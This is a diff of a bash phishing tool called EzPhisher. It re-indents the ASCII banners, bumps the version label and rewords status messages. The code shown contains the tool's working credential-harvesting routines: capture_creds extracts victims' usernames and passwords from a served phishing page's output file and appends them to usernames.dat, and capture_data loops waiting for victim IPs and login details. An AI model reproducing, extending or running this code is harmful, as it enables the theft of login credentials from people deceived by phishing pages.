@@ -52,11 +52,11 @@ kill_pid() {
 ## Banner
 banner() {
 	cat <<- EOF
-▄███▄   ▄▄▄▄▄▄   █ ▄▄   ▄  █ ▄█    ▄▄▄▄▄    ▄  █ ▄███▄   █▄▄▄▄ 
-█▀   ▀ ▀   ▄▄▀   █   █ █   █ ██   █     ▀▄ █   █ █▀   ▀  █  ▄▀ 
-██▄▄    ▄▀▀   ▄▀ █▀▀▀  ██▀▀█ ██ ▄  ▀▀▀▀▄   ██▀▀█ ██▄▄    █▀▀▌  
-█▄   ▄▀ ▀▀▀▀▀▀   █     █   █ ▐█  ▀▄▄▄▄▀    █   █ █▄   ▄▀ █  █  
-▀███▀             █       █   ▐               █  ▀███▀     █   
+	▄███▄   ▄▄▄▄▄▄   █ ▄▄   ▄  █ ▄█    ▄▄▄▄▄    ▄  █ ▄███▄   █▄▄▄▄ 
+	█▀   ▀ ▀   ▄▄▀   █   █ █   █ ██   █     ▀▄ █   █ █▀   ▀  █  ▄▀ 
+	██▄▄    ▄▀▀   ▄▀ █▀▀▀  ██▀▀█ ██ ▄  ▀▀▀▀▄   ██▀▀█ ██▄▄    █▀▀▌  
+	█▄   ▄▀ ▀▀▀▀▀▀   █     █   █ ▐█  ▀▄▄▄▄▀    █   █ █▄   ▄▀ █  █  
+	▀███▀             █       █   ▐               █  ▀███▀     █   
                    ▀     ▀                   ▀            ▀    
 		${GREEN}[-] EzPhisher is coded by AnonHexo${WHITE}
 	EOF
@@ -65,9 +65,9 @@ banner() {
 ## Small Banner
 banner_small() {
 	cat <<- EOF
-█▀▀ ▀█ █▀█ █ █ █ █▀ █ █ █▀▀ █▀█
-██▄ █▄ █▀▀ █▀█ █ ▄█ █▀█ ██▄ █▀▄
-                                ${WHITE} 1.1
+	█▀▀ ▀█ █▀█ █ █ █ █▀ █ █ █▀▀ █▀█
+	██▄ █▄ █▀▀ █▀█ █ ▄█ █▀█ ██▄ █▀▄
+                                ${WHITE} v1.1
 	EOF
 }
 
@@ -212,27 +212,25 @@ capture_ip() {
 ## Get credentials
 capture_creds() {
 	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | cut -d " " -f2)
-	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | cut -d ":" -f2)
+	PASSWORD=$(grep -o 'Password:.*' .server/www/usernames.txt | cut -d ":" -f2)
 	IFS=$'\n'
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account: ${BLUE}$ACCOUNT"
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password: ${BLUE}$PASSWORD"
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in: ${ORANGE}usernames.dat"
 	cat .server/www/usernames.txt >> usernames.dat
-	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
+	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Information, ${BLUE}Ctrl + C ${ORANGE}to exit. "
 }
 
 ## Print data
 capture_data() {
-	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
+	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Information, ${BLUE}Ctrl + C ${ORANGE}to exit..."
 	while true; do
 		if [[ -e ".server/www/ip.txt" ]]; then
-			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP:"
 			capture_ip
 			rm -rf .server/www/ip.txt
 		fi
 		sleep 0.75
 		if [[ -e ".server/www/usernames.txt" ]]; then
-			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login Information:"
 			capture_creds
 			rm -rf .server/www/usernames.txt
 		fi
